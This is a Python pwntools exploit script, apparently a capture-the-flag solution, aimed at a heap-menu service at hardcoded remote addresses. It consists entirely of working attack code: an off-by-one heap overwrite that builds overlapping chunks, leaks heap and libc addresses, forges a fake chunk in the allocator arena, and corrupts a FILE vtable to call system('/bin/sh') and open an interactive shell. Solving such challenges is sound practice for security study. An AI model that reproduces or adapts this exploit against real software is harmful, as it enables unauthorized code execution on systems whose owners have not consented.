#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.13"
#port = 8888
host = "202.120.7.204"
port = 127
#host = "35.189.186.86"
#port = 8888
r = remote(host,port)

def allocate(size):
    r.recvuntil("Command:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def update(idx,size,data):
    r.recvuntil("Command:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def remove(idx):
    r.recvuntil("Command:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def view(idx):
    r.recvuntil("Command:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

    
allocate(0x48)
allocate(0x48)
allocate(0x48)
allocate(0x48)
allocate(0x48)
remove(2)
remove(1)
update(0,0x49,"a"*0x48 + "\x52")
allocate(0x48)
view(1)
r.recvuntil(": ")
data = r.recvuntil("\n")[:8]
heap = u64(data) - 0xa0
print "heap:",hex(heap)
update(0,0x49,"a"*0x48 + "\xa1")
remove(1)
allocate(0x48)

update(1,0x48,"a"*0x40 + p64(0xa0))
allocate(0x48)
view(1)
r.recvuntil(": ")
data = r.recvuntil("\n")[:8]
#libc = u64(data) - 0x3c1b58
libc = u64(data) - 0x399b58
print "libc:" , hex(libc)
allocate(0x48)
remove(5)
remove(4)
remove(1)
allocate(0x38) # 1
allocate(0x38) # 4
allocate(0x58) # 5
allocate(0x38) # 6
update(1,0x39,"a"*0x38 + "\xa1")
update(5,0x58,"\x00"*0x50 + p64(0xa0))
remove(4)
remove(5)
allocate(0x38) #4
allocate(0x38) #5
update(4,0x39,"a"*0x38 + "\x61")
update(5,8,p64(0x51))
allocate(0x50)
#fake_chunk = libc + 0x3c1b20
fake_chunk = libc + 0x399b20
allocate(0x48)
update(8,8,p64(fake_chunk))
allocate(0x48)
allocate(0x48)
allocate(0x48)
malloc_hook = libc + 0x000000000399af0
#malloc_hook = libc + 0x3c1af0
#top = malloc_hook - 0x10
list_all = libc + 0x00000000039a500
#top = libc  + 0x3c24d8
top = list_all - 0x28
#update(11,0x48,p64(0)*5 + p64(top) + p64(0) +p64(libc +0x3c1b58)*2)
update(11,0x48,p64(0)*5 + p64(top) + p64(0) +p64(libc +0x399b58)*2)
allocate(0x38)
update(12,0x20,p64(0)*3 + p64(heap+0x18))
iojump = libc +  0x395c00
vtable = iojump + 0x10 - 0x18
#vtable = libc + 0x3bdbd0 - 0x18
update(8,0x49, p64(0) + p64(heap+0x30) + p64(0)*3 + p64(1)+p64(0)*2 + p64(vtable))
update(0,0x48,"\x00"*8 + "/bin/sh\x00" + "\x00"*0x28 + p64(1) + p64(2))
update(2,8,p64(heap+0x18))
system = libc + 0x3f480
update(3,8,p64(system))
update(8,0x49, p64(0) + p64(heap+0x30) + p64(0)*3 + p64(1)+p64(0)*2 + p64(vtable)*1)
remove(11)
r.interactive()
